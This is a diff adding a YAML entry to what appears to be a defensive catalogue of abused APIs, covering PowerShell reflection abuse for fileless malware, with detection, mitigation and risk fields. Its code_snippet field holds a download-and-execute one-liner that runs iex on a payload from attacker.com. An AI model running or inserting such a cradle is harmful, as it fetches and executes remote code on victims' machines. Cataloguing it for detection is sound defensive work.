@@ -1,0 +1,57 @@
+name: PowerShell - Reflection and .NET Abuse
+category: script-engine-api
+subcategory: code-execution
+api:
+  namespace: PowerShell.exe
+  language: PowerShell
+  documentation: https://learn.microsoft.com/en-us/powershell/
+  method: Reflection/System.Net.* abuse
+abuse_scenarios:
+- name: Fileless malware via reflection
+  technique_id: T1027.011
+  description: Load .NET assemblies and invoke methods without writing to disk
+  code_snippet: '[Reflection.Assembly]::LoadWithPartialName("System.Net"); $wc = New-Object
+    Net.WebClient; iex $wc.DownloadString(''http://attacker.com/payload'')'
+  detection_difficulty: hard
+  common_in_campaigns: true
+detection:
+- vendor: Microsoft Defender
+  effectiveness: medium
+  notes: Monitor for suspicious PowerShell Reflection patterns
+- vendor: EDR
+  effectiveness: high
+  notes: Behavioral detection of reflection-based execution
+mitigation:
+- category: policy
+  description: Restrict PowerShell execution via WDAC/AppLocker
+  feasibility: high
+- category: monitoring
+  description: Monitor PowerShell script block logging
+  feasibility: medium
+risk:
+  severity: critical
+  prevalence: widespread
+  ease_of_abuse: easy
+  likelihood_in_real_attacks: 95
+references:
+  techniques:
+  - T1027.011
+  threat_actors:
+  - APT29
+  - APT28
+  - FIN7
+  malware_families:
+  - PowerShell Empire
+  - Cobalt Strike
+  tools:
+  - Empire
+  - Cobalt Strike
+  - PSExec
+tags:
+- script-engine-api
+- reflection
+- fileless-malware
+id: 6dc5ff82-15f2-4fe7-b817-65ebe068c188
+author: magicsword-io
+created: '2026-02-02'
+verified: true
